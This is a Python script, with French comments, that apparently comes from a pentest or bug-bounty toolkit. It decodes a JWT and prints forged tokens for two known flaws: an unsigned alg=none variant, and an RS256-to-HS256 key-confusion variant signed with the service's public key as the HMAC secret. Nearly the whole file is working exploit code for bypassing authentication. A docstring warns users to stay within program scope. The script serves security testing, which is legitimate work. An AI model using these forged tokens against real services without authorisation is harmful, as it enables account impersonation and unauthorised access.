#!/usr/bin/env python3
"""
jwt_alg_confusion_check.py — Vérification rapide de vulnérabilités JWT courantes.

Usage : python3 jwt_alg_confusion_check.py <jwt_token> [--public-key public.pem]

Teste :
  1. alg=none acceptance (à envoyer manuellement contre la cible, ce script génère juste le payload)
  2. RS256 -> HS256 confusion (nécessite la clé publique du service, si connue/extraite)

⚠️ Ce script génère des payloads de test. L'envoi contre une cible réelle doit
respecter le scope et les règles du programme (voir docs/11-Legal-Ethics-and-OPSEC).
"""
import base64
import hashlib
import hmac
import json
import sys


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def decode_jwt_parts(token: str):
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("Token JWT invalide : doit contenir 3 parties séparées par des points.")
    header_b64, payload_b64, _sig_b64 = parts

    def pad(s: str) -> str:
        return s + "=" * (-len(s) % 4)

    header = json.loads(base64.urlsafe_b64decode(pad(header_b64)))
    payload = json.loads(base64.urlsafe_b64decode(pad(payload_b64)))
    return header, payload


def generate_alg_none_payload(header: dict, payload: dict) -> str:
    new_header = dict(header)
    new_header["alg"] = "none"
    header_b64 = b64url_encode(json.dumps(new_header, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{header_b64}.{payload_b64}."


def generate_hs256_confusion_payload(header: dict, payload: dict, public_key_pem: bytes) -> str:
    new_header = dict(header)
    new_header["alg"] = "HS256"
    header_b64 = b64url_encode(json.dumps(new_header, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{header_b64}.{payload_b64}".encode()
    signature = hmac.new(public_key_pem, signing_input, hashlib.sha256).digest()
    sig_b64 = b64url_encode(signature)
    return f"{header_b64}.{payload_b64}.{sig_b64}"


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)

    token = sys.argv[1]
    public_key_path = None
    if "--public-key" in sys.argv:
        idx = sys.argv.index("--public-key")
        public_key_path = sys.argv[idx + 1]

    header, payload = decode_jwt_parts(token)
    print(f"[*] Header original   : {header}")
    print(f"[*] Payload original  : {payload}")
    print()

    alg_none_token = generate_alg_none_payload(header, payload)
    print("[+] Payload de test alg=none (à envoyer manuellement en Authorization header) :")
    print(alg_none_token)
    print()

    if public_key_path:
        with open(public_key_path, "rb") as f:
            pub_key = f.read()
        confusion_token = generate_hs256_confusion_payload(header, payload, pub_key)
        print("[+] Payload de test RS256->HS256 confusion (clé publique utilisée comme secret HMAC) :")
        print(confusion_token)
    else:
        print("[*] Pas de clé publique fournie — test de confusion RS256->HS256 ignoré.")
        print("    Fournir --public-key <fichier.pem> si l'app utilise RS256 et que la clé publique est connue.")


if __name__ == "__main__":
    main()
